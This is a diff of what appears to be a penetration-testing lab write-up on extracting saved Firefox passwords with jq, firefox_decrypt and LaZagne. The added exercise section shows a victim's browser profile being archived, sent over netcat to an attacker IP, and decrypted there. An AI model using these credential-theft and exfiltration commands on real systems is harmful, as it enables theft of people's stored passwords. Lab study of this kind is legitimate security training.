@@ -1933,11 +1933,26 @@ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
 The tool [Firefox Decrypt](https://github.com/unode/firefox_decrypt) is excellent for decrypting these credentials, and is updated regularly. It requires Python 3.9 to run the latest version. Otherwise, `Firefox Decrypt 0.7.0` with Python 2 must be used.
 
 ```shell
-cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
+python3.9 firefox_decrypt.py
 ```
 
-The tool [Firefox Decrypt](https://github.com/unode/firefox_decrypt) is excellent for decrypting these credentials, and is updated regularly. It requires Python 3.9 to run the latest version. Otherwise, `Firefox Decrypt 0.7.0` with Python 2 must be used.
+Alternatively, `LaZagne` can also return results if the user has used the supported browser.
+## Exercise
+### Examine the target and find out the password of the user Will. Then, submit the password as the answer.
 
 ```shell
-python3.9 firefox_decrypt.py
+ls -l .mozilla/firefox/ | grep default
+cat .mozilla/firefox/ytb95ytb.default-release/logins.json | jq .
+```
+
+Sent the file via `netcat`:
+
+```shell
+# Attacker
+nc -lvnp 4444 > firefox.mozilla
+# Victim
+tar czf firefox.tar.gz ~/.mozilla/firefox/ytb95ytb.default-release/
+nc 10.10.15.48 4444 < firefox.tar.gz
+# Attacker (in unziped folder)
+python3 ~/Desktop/Tools/firefox_decrypt/firefox_decrypt.py ytb95ytb.default-release
 ```
